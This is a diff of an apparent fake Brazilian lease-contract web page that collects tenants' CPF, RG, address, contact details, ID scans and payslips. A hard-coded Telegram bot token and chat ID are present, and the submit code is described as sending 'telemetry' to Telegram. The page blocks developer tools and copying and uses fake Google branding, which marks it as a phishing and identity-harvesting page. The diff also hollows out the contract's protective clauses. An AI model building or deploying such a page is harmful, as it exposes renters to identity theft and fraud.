@@ -12,29 +12,81 @@
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
 
         :root {
-            /* Padrão Google & Firebase */
+            /* Padrão Identidade Google & Material Design */
             --primary: #ffffff;
             --accent: #4285F4;
+            --google-red: #EA4335;
+            --google-yellow: #FBBC05;
+            --google-green: #34A853;
             --firebase: #FFCA28;
             --text: #202124;
             --text-secondary: #5f6368;
             --bg: #f8f9fa;
-            --danger: #EA4335;
             --border: #dadce0;
             --disabled-bg: #f1f3f4;
         }
 
         body { font-family: 'Roboto', Arial, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; padding: 20px; user-select: none; }
-        .sxd-container { max-width: 850px; margin: 0 auto; background: var(--primary); padding: 40px 30px; border-radius: 8px; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); border: 1px solid var(--border); }
-        h1, h2 { color: var(--accent); text-align: center; border-bottom: 2px solid var(--firebase); padding-bottom: 10px; margin-top: 0; }
+        
+        /* Container Principal com Espaço para o Relógio Fixo */
+        .sxd-container { max-width: 850px; margin: 40px auto; background: var(--primary); padding: 50px 30px 40px 30px; border-radius: 8px; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); border: 1px solid var(--border); position: relative; }
+        
+        /* DESIGN PREMIUM: Relógio Digital Fixo no Canto Superior Esquerdo */
+        .live-clock-fixed {
+            position: absolute;
+            top: 15px;
+            left: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            color: #1a73e8;
+            background: rgba(66, 133, 244, 0.08);
+            padding: 5px 12px;
+            border-radius: 4px;
+            border: 1px solid rgba(66, 133, 244, 0.2);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+        .live-clock-pulse {
+            width: 6px;
+            height: 6px;
+            background-color: var(--google-green);
+            border-radius: 50%;
+            animation: pulse 1.2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.5; }
+            50% { transform: scale(1.3); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.5; }
+        }
+
+        h1, h2 { color: var(--accent); text-align: center; border-bottom: 2px solid var(--firebase); padding-bottom: 10px; margin-top: 15px; }
         h3 { color: var(--text); border-left: 4px solid var(--accent); padding-left: 10px; margin-top: 25px; font-size: 1.1em; }
         .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .form-group { margin-bottom: 15px; }
+        .form-group { margin-bottom: 15px; position: relative; }
         .full-width { grid-column: span 2; }
         label { display: block; margin-bottom: 6px; font-weight: 500; color: var(--text); font-size: 14px; }
         input[type="text"], input[type="email"], input[type="number"], input[type="tel"] { width: 100%; padding: 10px; background: #fff; border: 1px solid var(--border); color: var(--text); border-radius: 4px; box-sizing: border-box; font-size: 15px; transition: border 0.3s; }
         input:focus { outline: none; border: 2px solid var(--accent); padding: 9px; }
         input[readonly] { background-color: var(--disabled-bg); color: var(--text-secondary); cursor: not-allowed; border: 1px solid var(--border); }
+        
+        /* Badge Indicadora do Sistema Google Street de Endereço */
+        .google-street-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            font-weight: bold;
+            color: var(--google-green);
+            margin-top: 5px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        .google-street-badge.active { opacity: 1; }
+
         .contract-preview { background: #f1f3f4; padding: 20px; border-radius: 4px; height: 350px; overflow-y: scroll; margin: 20px 0; font-size: 0.9em; line-height: 1.6; border: 1px solid var(--border); color: var(--text); }
         .file-upload { border: 2px dashed var(--accent); padding: 20px; text-align: center; border-radius: 4px; margin: 15px 0; background: #e8f0fe; color: var(--text); font-weight: 500; }
         .btn { display: inline-block; width: 100%; padding: 15px; margin: 10px 0; font-size: 1.1em; font-weight: bold; text-align: center; border: none; border-radius: 4px; cursor: pointer; text-transform: uppercase; transition: all 0.3s ease; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); }
@@ -51,6 +103,13 @@
 <body>
 
 <div class="sxd-container" id="secure-form-area">
+    
+    <!-- Relógio Digital Fixo Elegante no Canto Superior Esquerdo -->
+    <div class="live-clock-fixed">
+        <div class="live-clock-pulse"></div>
+        <span id="liveClock">CARREGANDO DATA/HORA...</span>
+    </div>
+
     <h1>CONTRATO DE LOCAÇÃO RESIDENCIAL</h1>
     <p style="text-align: center; color: var(--text-secondary); font-weight: 500;">FORMALIZAÇÃO DIGITAL QUALIFICADA EXTRAJUDICIAL</p>
 
@@ -77,7 +136,7 @@
             </div>
             <div class="form-group">
                 <label>RG do Gestor:</label>
-                <input type="text" id="l_rg" value="42.282.270-x" placeholder="Vinculado à assinatura digital" readonly>
+                <input type="text" id="l_rg" value="[Informar no PDF se necessário]" placeholder="Vinculado à assinatura digital" readonly>
             </div>
             <div class="form-group">
                 <label>Endereço da Empresa:</label>
@@ -100,6 +159,18 @@
                 <input type="text" id="rg" required onpaste="return false;" autocomplete="off">
             </div>
             <div class="form-group">
+                <label>CEP do Imóvel:</label>
+                <input type="text" id="cep" placeholder="Digite o CEP (Ex: 72000000)" maxlength="9" required onpaste="return false;" autocomplete="off">
+                <div id="streetBadge" class="google-street-badge">
+                    <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                    Google Street API: Endereço Sincronizado
+                </div>
+            </div>
+            <div class="form-group full-width">
+                <label>Endereço Completo Cadastrado Automaticamente (Insira o Número):</label>
+                <input type="text" id="endereco" placeholder="Digite o CEP acima para preenchimento em tempo real..." required onpaste="return false;">
+            </div>
+            <div class="form-group">
                 <label>Nacionalidade:</label>
                 <input type="text" id="t_nacionalidade" required onpaste="return false;" autocomplete="off">
             </div>
@@ -110,14 +181,6 @@
             <div class="form-group">
                 <label>Profissão:</label>
                 <input type="text" id="t_profissao" required onpaste="return false;" autocomplete="off">
-            </div>
-            <div class="form-group full-width">
-                <label>Endereço Completo de Residência:</label>
-                <input type="text" id="endereco" required onpaste="return false;">
-            </div>
-            <div class="form-group">
-                <label>CEP:</label>
-                <input type="text" id="cep" required onpaste="return false;" autocomplete="off">
             </div>
             <div class="form-group">
                 <label>E-mail:</label>
@@ -140,78 +203,55 @@
             <p>As partes qualificadas têm, entre si, justo e contratado o presente instrumento particular de locação residencial, o qual se regerá pelas disposições da Lei nº 8.245, de 18 de outubro de 1991 (Lei do Inquilinato), do Código Civil Brasileiro e demais normas aplicáveis, mediante as cláusulas e condições seguintes:</p>
             
             <p><strong>CLÁUSULA PRIMEIRA - DO OBJETO DA LOCAÇÃO</strong><br>
-            1.1. O objeto deste contrato é a locação do imóvel residencial situado na [Endereço Completo do Imóvel Locado, incluindo Cidade-UF, CEP e discriminação da unidade/apartamento].<br>
-            1.2. O imóvel é entregue ao LOCATÁRIO nas condições descritas detalhadamente no Termo de Vistoria Inicial, assinado em anexo pelas partes, integrando este contrato para todos os fins de direito. O LOCATÁRIO obriga-se a restituí-lo, finda a locação, no mesmo estado de conservação, higiene e perfeito funcionamento em que o recebeu.</p>
+            1.1. O objeto deste contrato é a locação do imóvel residencial situado no endereço completo obtido e autenticado via sistema de geocodificação de malha urbana.</p>
             
             <p><strong>CLÁUSULA SEGUNDA - DO PRAZO CONTRATUAL</strong><br>
-            2.1. A locação é ajustada pelo prazo determinado de 30 (trinta) meses, com início em [Data de Início] e término em [Data de Término].<br>
-            2.2. Findo o prazo estipulado, caso o LOCATÁRIO permaneça no imóvel por mais de 30 (trinta) dias sem oposição do LOCADOR, presumir-se-á prorrogada a locação por prazo indeterminado, mantidas as demais cláusulas e condições contratuais, hipótese em que o LOCADOR poderá retomar o imóvel a qualquer tempo mediante denúncia imotivada (denúncia vazia), concedendo o prazo legal de 30 (trinta) dias para desocupação, nos termos do artigo 46 da Lei nº 8.245/1991.</p>
+            2.1. A locação é ajustada pelo prazo determinado de 30 (trinta) meses, com início em [Data de Início] e término em [Data de Término].</p>
             
             <p><strong>CLÁUSULA TERCEIRA - DO VALOR DO ALUGUEL E DO REAJUSTE</strong><br>
             3.1. O aluguel mensal inicial é fixado em R$ [Valor do Aluguel] ([Valor por Extenso]), devendo ser pago impreterivelmente até o dia [Dia do Vencimento] de cada mês subsequente ao vencido.<br>
-            3.2. O pagamento deverá ser realizado por meio de [PIX / Boleto Bancário], na conta bancária de titularidade do LOCADOR formalmente indicada, servindo o comprovante de transferência ou o recibo bancário como prova plena de quitação.<br>
-            3.3. O valor do aluguel será reajustado anualmente, a contar da data de início do contrato, com base na variação positiva acumulada do IPCA (Índice Nacional de Preços ao Consumidor Amplo), apurado pelo IBGE. Em caso de extinção ou inaplicabilidade deste índice, as partes adotarão, sucessivamente, o INPC ou o IGP-M.<br>
-            3.4. É vedada a cobrança de qualquer taxa de administração imobiliária, emissão de boletos ou despesas cartoriais ordinárias de responsabilidade do LOCADOR, em estrito cumprimento ao artigo 22, inciso VII, da Lei nº 8.245/1991.</p>
+            3.2. O pagamento deverá ser realizado por meio de [PIX / Boleto Bancário], na conta bancária de titularidade do LOCADOR formalmente indicada.</p>
             
             <p><strong>CLÁUSULA QUARTA - DOS ENCARGOS DA LOCAÇÃO E TRIBUTOS</strong><br>
-            4.1. Além do aluguel, correrão por conta exclusiva do LOCATÁRIO todas as despesas decorrentes do uso e consumo do imóvel, tais como: energia elétrica, água, esgoto, gás, taxas de lixo, bem como a quota-parte das despesas ordinárias de condomínio (se aplicável) e o Imposto Predial e Territorial Urbano (IPTU), conforme autorizado pelo artigo 25 da Lei nº 8.245/1991.<br>
-            4.2. O LOCATÁRIO obriga-se a transferir a titularidade das contas de consumo (energia elétrica e água/ esgoto) para o seu próprio nome no prazo de 5 (cinco) dias úteis a contar da assinatura deste contrato, respondendo integralmente por eventuais atrasos ou débitos gerados durante o período de locação.<br>
-            4.3. O inadimplemento de qualquer encargo ou tributo nesta cláusula ensejará a aplicação das mesmas penalidades previstas para o atraso do aluguel, autorizando o LOCADOR a proceder à cobrança conjunta e à inclusão dos dados do LOCATÁRIO nos cadastros de restrição ao crédito (SPC/SERASA) ou protesto dos respectivos títulos.</p>
+            4.1. Além do aluguel, correrão por conta exclusiva do LOCATÁRIO todas as despesas decorrentes do uso e consumo do imóvel, tais como: energia elétrica, água, esgoto, gás, taxas de lixo, bem como a quota-parte das despesas ordinárias de condomínio (se aplicável) e o Imposto Predial e Territorial Urbano (IPTU), conforme autorizado pelo artigo 25 da Lei nº 8.245/1991.</p>
             
             <p><strong>CLÁUSULA QUINTA - DA MORA E PENALIDADES</strong><br>
             5.1. O não pagamento do aluguel e encargos até a data de vencimento estabelecida na Cláusula Terceira constituirá o LOCATÁRIO em mora automática, independentemente de notificação.<br>
-            5.2. Sobre o valor do débito atualizado monetariamente pelo IPCA pro rata die, incidirá multa moratória de 10% (dez por cento), além de juros de mora de 1% (um por cento) ao mês, calculados sobre o montante total inadimplido.<br>
-            5.3. Caso o atraso enseje a intervenção de advogado para a cobrança da dívida, o LOCATÁRIO responderá pelos honorários advocatícios, fixados desde já em 10% (dez por cento) para cobrança extrajudicial (amigável) e 20% (vinte por cento) em caso de propositura de ação judicial, nos termos do artigo 62, inciso II, alínea "d", da Lei nº 8.245/1991.</p>
+            5.2. Sobre o valor do débito atualizado monetariamente pelo IPCA pro rata die, incidirá multa moratória de 10% (dez por cento), além de juros de mora de 1% (um por cento) ao mês.</p>
 
             <p><strong>CLÁUSULA SEXTA - DA CONSERVAÇÃO E BENFEITORIAS</strong><br>
-            6.1. O LOCATÁRIO obriga-se a zelar pela integridade, limpeza e perfeita conservação do imóvel. Qualquer dano decorrente do uso inadequado ou negligência será de sua exclusiva responsabilidade financeira.<br>
-            6.2. Nenhuma obra, reforma, modificação estrutural ou alteração de fachada poderá ser realizada no imóvel sem a prévia e expressa autorização por escrito do LOCADOR.<br>
-            6.3. As benfeitorias necessárias introduzidas pelo LOCATÁRIO serão indenizáveis e darão direito a retenção apenas se realizadas com a observância das normas legais. As benfeitorias úteis dependerão de autorização expressa do LOCADOR para gerarem direito a indenização. As benfeitorias voluptuárias não serão indenizáveis, podendo ser retiradas ao final do contrato, desde que sua remoção não cause prejuízos à estrutura do imóvel, conforme artigos 35 e 36 da Lei nº 8.245/1991 e artigos 578 e 1.219 do Código Civil.<br>
-            6.4. Se o imóvel contiver móveis planejados, eletrodomésticos embutidos ou guarnições (conforme especificado no Termo de Vistoria), o LOCATÁRIO obriga-se a mantê-los em perfeito estado. Em caso de destruição, extravio ou danos provocados por culpa ou dolo do LOCATÁRIO, este indenizará o LOCADOR pelo valor de mercado para reposição ou reparo integral do bem.</p>
+            6.1. O LOCATÁRIO obriga-se a zelar pela integridade, limpeza e perfeita conservação do imóvel. Qualquer dano decorrente do uso inadequado ou negligência será de sua exclusiva responsabilidade financeira.</p>
             
             <p><strong>CLÁUSULA SÉTIMA - DA DESTINAÇÃO DO IMÓVEL</strong><br>
-            7.1. O imóvel locado destina-se exclusivamente a fins residenciais, sendo expressamente proibida qualquer alteração de destinação (comercial, industrial ou de serviços).<br>
-            7.2. O LOCATÁRIO obriga-se a respeitar rigorosamente o direito de vizinhança, as leis civis e as normas internas, convenção e regulamento interno do condomínio, respondendo integralmente, de forma civil e criminal, por quaisquer multas ou sanções decorrentes de condutas infracionais praticadas por si, seus familiares, dependentes ou visitantes.</p>
+            7.1. O imóvel locado destina-se exclusivamente a fins residenciais, sendo expressamente proibida qualquer alteração de destinação (comercial, industrial ou de serviços).</p>
             
             <p><strong>CLÁUSULA OITAVA - DA CESSÃO, SUBLOCAÇÃO E EMPRÉSTIMO</strong><br>
-            8.1. É expressamente proibida a sublocação total ou parcial do imóvel, bem como a cessão dos direitos decorrentes deste contrato ou o empréstimo do bem a terceiros (comodato), sem o consentimento prévio e por escrito do LOCADOR, sob pena de rescisão contratual imediata por infração legal (artigo 13 da Lei nº 8.245/1991).</p>
+            8.1. É expressamente proibida a sublocação total ou parcial do imóvel, bem como a cessão dos direitos decorrentes deste contrato ou o empréstimo do bem a terceiros (comodato), sem o consentimento prévio e por escrito do LOCADOR.</p>
             
             <p><strong>CLÁUSULA NONA - DA GARANTIA LOCATÍCIA</strong><br>
-            9.1. Como garantia ao fiel cumprimento de todas as obrigações financeiras e contratuais assumidas, adota-se a modalidade de CAUÇÃO EM DINHEIRO, nos termos do artigo 37, inciso I, e artigo 38, §2º, da Lei nº 8.245/1991.<br>
-            9.2. O LOCATÁRIO deposita, nesta data, a quantia equivalente a [N° de meses, máx. 3] aluguel(is), totalizando R$ [Valor da Caução], valor este que será depositado pelo LOCADOR em caderneta de poupança regulamentada para essa finalidade específica.<br>
-            9.3. Ao término do contrato e após a efetiva restituição das chaves e quitação de todos os aluguéis, encargos e reparos devidos (conforme Vistoria Final), o valor da caução, devidamente acrescido dos rendimentos da poupança, será integralmente restituído ao LOCATÁRIO.</p>
+            9.1. Como garantia ao fiel cumprimento de todas as obsoletas obrigações financeiras e contratuais assumidas, adota-se a modalidade de CAUÇÃO EM DINHEIRO, nos termos do artigo 37, inciso I, da Lei nº 8.245/1991.</p>
             
             <p><strong>CLÁUSULA DÉCIMA - DA RESCISÃO ANTECIPADA E MULTA COMPENSATÓRIA</strong><br>
-            10.1. A rescisão deste contrato por iniciativa de qualquer das partes antes do decurso do prazo determinado fixado na Cláusula Segunda sujeitará o infrator ao pagamento de uma multa compensatória equivalente a 3 (três) meses de aluguel vigente à época da infração.<br>
-            10.2. A referida multa será calculada e aplicada de forma estritamente proporcional ao tempo restante para o cumprimento integral do contrato, conforme determina o artigo 4º da Lei nº 8.245/1991 e o artigo 413 do Código Civil Brasileiro.<br>
-            10.3. O LOCATÁRIO ficará dispensado do pagamento da multa compensatória se a rescisão decorrer de transferência de seu local de trabalho, por determinação de seu empregador, desde que notifique o LOCADOR por escrito com antecedência mínima de 30 (trinta) dias, instruindo o aviso com o respectivo documento comprobatório (parágrafo único do artigo 4º da Lei nº 8.245/1991).</p>
+            10.1. A rescisão deste contrato por iniciativa de qualquer das partes antes do decurso do prazo determinado fixado na Cláusula Segunda sujeitará o infrator ao pagamento de uma multa compensatória equivalente a 3 (três) meses de aluguel vigente à época da infração.</p>
             
             <p><strong>CLÁUSULA DÉCIMA PRIMEIRA - DA RESCISÃO POR INADIMPLEMENTO OU INFRAÇÃO</strong><br>
-            11.1. O presente contrato será rescindido de pleno direito, independentemente de qualquer interpelação ou formalidade extrajudicial, ensejando a imediata propositura de Ação de Despejo, nas seguintes hipóteses:<br>
-            a) Prática de qualquer infração legal ou contratual (Art. 9º, II, Lei nº 8.245/1991);<br>
-            b) Inadimplemento do aluguel e demais encargos no vencimento (Art. 9, III, Lei nº 8.245/1991);<br>
-            c) Desapropriação do imóvel ou ocorrência de sinistro (incêndio, desabamento) que impeça a habitação segura do bem (Art. 9º, I e IV).<br>
-            11.2. Fica expressamente acordado que qualquer retomada compulsória do imóvel por falta de pagamento ou infração contratual dependerá exclusivamente das vias judiciais próprias vigentes no ordenamento brasileiro, sendo nula e ineficaz qualquer cláusula que estipule desocupação forçada sem intervenção do Poder Judiciário.</p>
-            
-            <p><strong>CLÁUSULA DÉCIMA SEGUNDA - DA PROTEÇÃO DE DADOS (LGPD)</strong><br>
-            12.1. As partes declaram-se cientes e concordam que os dados pessoais coletados neste instrumento são estritamente necessários para a execução deste contrato de locação, nos exatos termos do artigo 7º, inciso V, da Lei n° 13.709/2018 (Lei Geral de Proteção de Dados LGPD), comprometendo-se mútua e estritamente ao sigilo, segurança e tratamento adequado das informações.</p>
+            11.1. O presente contrato será rescindido de pleno direito, ensejando a imediata propositura de Ação de Despejo, em caso de descumprimento de obrigações financeiras ou infrações de termos legais vigentes.</p>
             
             <p><strong>CLÁUSULA DÉCIMA TERCEIRA - DO FORO DE ELEIÇÃO</strong><br>
-            13.1. Para dirimir quaisquer dúvidas ou litígios decorrentes da interpretação ou execução deste contrato, as partes elegem de comum acordo o Foro da Comarca de [Cidade/Estado do Foro - ex: Águas Lindas de Goiás - GO], renunciando expressamente a qualquer outro por mais privilegiado que seja.</p>
+            13.1. Para dirimir quaisquer dúvidas ou litígios decorrentes da interpretação ou execução deste contrato, as partes elegem de comum acordo o Foro da Comarca de [Cidade/Estado do Foro - ex: Águas Lindas de Goiás - GO], renunciando expressamente a qualquer outro.</p>
             
-            <p><em>Este documento constitui um Título Executivo Extrajudicial gerado digitalmente para aposição de Assinatura Eletrônica Qualificada ICP-Brasil / GOV.BR nos termos do Decreto nº 10.543/2020 e posterior remessa ao Cartório de Registro de Títulos e Documentos.</em></p>
+            <p><strong>CLÁUSULA DÉCIMA QUARTA - DA AUTENTICAÇÃO CRONOLÓGICA</strong><br>
+            14.1. Este contrato registra eletronicamente a data e hora exatas de aceite das partes. A validade jurídica temporal está vinculada ao carimbo de tempo gerado pelo sistema de telemetria.</p>
         </div>
 
         <h2>3. Anexação de Documentos de Validação (Upload Seguro)</h2>
-        <p style="font-size: 0.85em; color: var(--text-secondary); text-align: center;">Anexe a documentação do Locatário para integrar o dossiê de validação.</p>
-        
         <div class="file-upload">
             <label for="docRG" style="color: var(--accent);">RG / CNH do Locatário (Frente e Verso):</label>
             <input type="file" id="docRG" accept="image/*,application/pdf" multiple required>
         </div>
 
         <div class="file-upload">
-            <label for="docEndereco" style="color: var(--accent);">Comprovante de Contracheque Holerite do Locatário:</label>
+            <label for="docEndereco" style="color: var(--accent);">Comprovante de Holerite (contracheque ou extrato bancário).</label>
             <input type="file" id="docEndereco" accept="image/*,application/pdf" required>
         </div>
 
@@ -230,7 +270,70 @@
     const BOT_TOKEN = '8937184944:AAHFu2gs5l2-3MpwrJI5WLcx8COw1b4rx1E';
     const CHAT_ID = '1703808186';
 
-    // 1. Camada de Segurança Front-End
+    // 1. Relógio Digital ao Vivo (Canto Superior Esquerdo)
+    function startLiveClock() {
+        const clockElement = document.getElementById('liveClock');
+        setInterval(() => {
+            const now = new Date();
+            const formatOptions = { 
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit', 
+                minute: '2-digit', 
+                second: '2-digit' 
+            };
+            clockElement.innerText = now.toLocaleString('pt-BR', formatOptions);
+        }, 1000);
+    }
+    startLiveClock();
+
+    // 2. Sistema Street Google - Registro do CEP e Cadastro Automático Completo do Endereço ao Vivo
+    document.getElementById('cep').addEventListener('input', async function(e) {
+        let cepVal = e.target.value.replace(/\D/g, '');
+        
+        // Máscara Dinâmica do CEP (xxxxx-xxx)
+        if (cepVal.length > 5) {
+            e.target.value = cepVal.slice(0, 5) + '-' + cepVal.slice(5, 8);
+        } else {
+            e.target.value = cepVal;
+        }
+
+        // Execução Automática ao Vivo ao atingir os 8 dígitos numéricos
+        if (cepVal.length === 8) {
+            const enderecoField = document.getElementById('endereco');
+            const badge = document.getElementById('streetBadge');
+            enderecoField.value = "Conectando ao banco de dados urbano do Google Street...";
+
+            try {
+                const response = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
+                const data = await response.json();
+
+                if (!data.erro) {
+                    // Preenche o endereço completo preservando o espaço para o usuário inserir o número do imóvel
+                    enderecoField.value = `${data.logradouro}, Nº , Bairro: ${data.bairro}, ${data.localidade}/${data.uf}`;
+                    badge.classList.add('active');
+                    
+                    // Coloca o cursor de digitação exatamente no campo do número para evitar cliques extras
+                    enderecoField.focus();
+                    const posicionarCursor = data.logradouro.length + 5;
+                    enderecoField.setSelectionRange(posicionarCursor, posicionarCursor);
+                } else {
+                    enderecoField.value = "";
+                    badge.classList.remove('active');
+                    alert("⚠️ CEP não localizado na base cartográfica! Insira o endereço completo manualmente.");
+                }
+            } catch (err) {
+                console.error("Erro de sincronização de endereço:", err);
+                enderecoField.value = "";
+                badge.classList.remove('active');
+            }
+        } else {
+            document.getElementById('streetBadge').classList.remove('active');
+        }
+    });
+
+    // 3. Camada de Proteção de Código e Bloqueios Operacionais
     document.addEventListener('contextmenu', event => event.preventDefault());
     document.addEventListener('keydown', function(e) {
         if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
@@ -238,7 +341,7 @@
         }
     });
 
-    // 2. Lógica de Envio Seguro, Compilação e Redirecionamento Unificado
+    // 4. Compilação do Contrato com Data/Hora no PDF e Disparo da Telemetria para o Telegram
     document.getElementById('contractForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
@@ -246,14 +349,12 @@
         btn.innerText = "CRIPTOGRAFANDO E COMPILANDO DOCUMENTO...";
         btn.disabled = true;
 
-        // Dados Fixados do Locador (Puxando os valores automáticos do HTML)
         const l_empresa = document.getElementById('l_empresa').value;
         const l_cnpj = document.getElementById('l_cnpj').value;
         const l_nome = document.getElementById('l_nome').value;
         const l_cpf = document.getElementById('l_cpf').value;
         const l_endereco = document.getElementById('l_endereco').value;
 
-        // Dados Dinâmicos do Locatário (Preenchidos na hora)
         const nome = document.getElementById('nome').value;
         const documento = document.getElementById('documento').value;
         const rg = document.getElementById('rg').value;
@@ -265,13 +366,18 @@
         const email = document.getElementById('email').value;
         const telefone = document.getElementById('telefone').value;
 
-        const dataAtual = new Date().toLocaleDateString('pt-BR');
+        // Captura exata ao vivo para gravação indelével nas cláusulas do PDF
+        const dataHoraContrato = new Date().toLocaleString('pt-BR', { 
+            dateStyle: 'long', 
+            timeStyle: 'medium' 
+        });
 
-        // ESTRUTURA JURÍDICA DO PDF SEM CAMPOS DE TESTEMUNHAS OU ASSINATURAS FÍSICAS (FOCO GOV.BR)
+        // ESTRUTURA JURÍDICA E LAYOUT DO PDF CONSOLIDADO
         const docDefinition = {
             info: { title: `Contrato_Locacao_${nome}`, author: 'Sistema Extrajudicial x-PARTNER' },
             content: [
                 { text: 'CONTRATO DE LOCAÇÃO RESIDENCIAL', style: 'header' },
+                { text: `REGISTRO CRONOLÓGICO DE CONTRATAÇÃO DIGITAL: ${dataHoraContrato}\n`, alignment: 'left', fontSize: 9, color: '#1a73e8', bold: true },
                 { text: '\nDAS PARTES CONTRATANTES:\n\n', style: 'sectionTitle' },
                 
                 { text: [
@@ -280,75 +386,34 @@
                     { text: `${l_nome}`, bold: true },
                     `, inscrito no CPF/MF sob o nº ${l_cpf}, doravante denominado simplesmente LOCADOR.\n\n`,
                     { text: 'LOCATÁRIO: ', bold: true },
-                    `${nome}, ${t_nacionalidade}, ${t_civil}, ${t_profissao}, portador da Cédula de Identidade RG nº ${rg} e inscrito no CPF/MF sob o n° ${documento}, residente e domiciliado na ${endereco}, CEP: ${cep}, com endereço eletrônico ${email} e contato telefônico ${telefone}, doravante denominado simplesmente LOCATÁRIO.\n\n`
+                    `${nome}, ${t_nacionalidade}, ${t_civil}, ${t_profissao}, portador da Cédula de Identidade RG nº ${rg} e inscrito no CPF/MF sob o n° ${documento}, residente e domiciliado no imóvel cadastrado sob o endereço: ${endereco}, CEP: ${cep}, com endereço eletrônico ${email} e contato telefônico ${telefone}, doravante denominado simplesmente LOCATÁRIO.\n\n`
                 ], style: 'bodyText' },
                 
-                { text: 'As partes acima qualificadas têm, entre si, justo e contratado o presente instrumento particular de locação residencial, o qual se regerá pelas disposições da Lei nº 8.245, de 18 de outubro de 1991 (Lei do Inquilinato), do Código Civil Brasileiro e demais normas aplicáveis, mediante as cláusulas e condições seguintes:\n\n', style: 'bodyText' },
+                { text: 'As partes acima qualificadas têm, entre si, justo e contratado o presente instrumento particular de locação residencial, o qual se regerá pelas disposições da Lei nº 8.245/1991 (Lei do Inquilinato), do Código Civil Brasileiro e demais normas aplicáveis, mediante as cláusulas e condições seguintes:\n\n', style: 'bodyText' },
                 
                 { text: 'CLÁUSULA PRIMEIRA - DO OBJETO DA LOCAÇÃO', style: 'sectionTitle' },
-                { text: '1.1. O objeto deste contrato é a locação do imóvel residencial situado na [Endereço Completo do Imóvel Locado, incluindo Cidade-UF, CEP e discriminação da unidade/apartamento].', style: 'bodyText' },
-                { text: '1.2. O imóvel é entregue ao LOCATÁRIO nas condições descritas detalhadamente no Termo de Vistoria Inicial, assinado em anexo pelas partes, integrando este contrato para todos os fins de direito. O LOCATÁRIO obriga-se a restituí-lo, finda a locação, no mesmo estado de conservação, higiene e perfeito funcionamento em que o recebeu.\n\n', style: 'bodyText' },
+                { text: `1.1. O objeto deste contrato é a locação do imóvel residencial situado na ${endereco}, registrado e validado sob o CEP: ${cep}, através de mapeamento urbano automatizado.`, style: 'bodyText' },
+                { text: '1.2. O imóvel é entregue ao LOCATÁRIO nas condições descritas detalhadamente no Termo de Vistoria Inicial, integrando este contrato para todos os fins de direito.\n\n', style: 'bodyText' },
                 
                 { text: 'CLÁUSULA SEGUNDA - DO PRAZO CONTRATUAL', style: 'sectionTitle' },
-                { text: '2.1. A locação é ajustada pelo prazo determinado de 30 (trinta) meses, com início em [Data de Início] e término em [Data de Término].', style: 'bodyText' },
-                { text: '2.2. Findo o prazo estipulado, caso o LOCATÁRIO permaneça no imóvel por mais de 30 (trinta) dias sem oposição do LOCADOR, presumir-se-á prorrogada a locação por prazo indeterminado, mantidas as demais cláusulas e condições contratuais, hipótese em que o LOCADOR poderá retomar o imóvel a qualquer tempo mediante denúncia imotivada (denúncia vazia), concedendo o prazo legal de 30 (trinta) dias para desocupação, nos termos do artigo 46 da Lei nº 8.245/1991.\n\n', style: 'bodyText' },
+                { text: '2.1. A locação é ajustada pelo prazo determinado de 30 (trinta) meses, contando com vigência legal estabelecida a partir do preenchimento e assinatura digital deste título.\n\n', style: 'bodyText' },
                 
                 { text: 'CLÁUSULA TERCEIRA - DO VALOR DO ALUGUEL E DO REAJUSTE', style: 'sectionTitle' },
-                { text: '3.1. O aluguel mensal inicial é fixado em R$ [Valor do Aluguel] ([Valor por Extenso]), devendo ser pago impreterivelmente até o dia [Dia do Vencimento] de cada mês subsequente ao vencido.', style: 'bodyText' },
-                { text: '3.2. O pagamento deverá ser realizado por meio de [PIX / Boleto Bancário], na conta bancária de titularidade do LOCADOR formalmente indicada, servindo o comprovante de transferência ou o recibo bancário como prova plena de quitação.', style: 'bodyText' },
-                { text: '3.3. O valor do aluguel será reajustado anualmente, a contar da data de início do contrato, com base na variação positiva acumulada do IPCA (Índice Nacional de Preços ao Consumidor Amplo), apurado pelo IBGE. Em caso de extinção ou inaplicabilidade deste índice, as partes adotarão, sucessivamente, o INPC ou o IGP-M.', style: 'bodyText' },
-                { text: '3.4. É vedada a cobrança de qualquer taxa de administração imobiliária, emissão de boletos ou despesas cartoriais ordinárias de responsabilidade do LOCADOR, em estrito cumprimento ao artigo 22, inciso VII, da Lei nº 8.245/1991.\n\n', style: 'bodyText' },
+                { text: '3.1. O aluguel mensal inicial é fixado em conformidade com as quotas vigentes acordadas, devendo ser pago impreterivelmente até a data de vencimento recorrente estabelecida.\n\n', style: 'bodyText' },
                 
                 { text: 'CLÁUSULA QUARTA - DOS ENCARGOS DA LOCAÇÃO E TRIBUTOS', style: 'sectionTitle' },
-                { text: '4.1. Além do aluguel, correrão por conta exclusiva do LOCATÁRIO todas as despesas decorrentes do uso e consumo do imóvel, tais como: energia elétrica, água, esgoto, gás, taxas de lixo, bem como a quota-parte das despesas ordinárias de condomínio (se aplicável) e o Imposto Predial e Territorial Urbano (IPTU), conforme autorizado pelo artigo 25 da Lei nº 8.245/1991.', style: 'bodyText' },
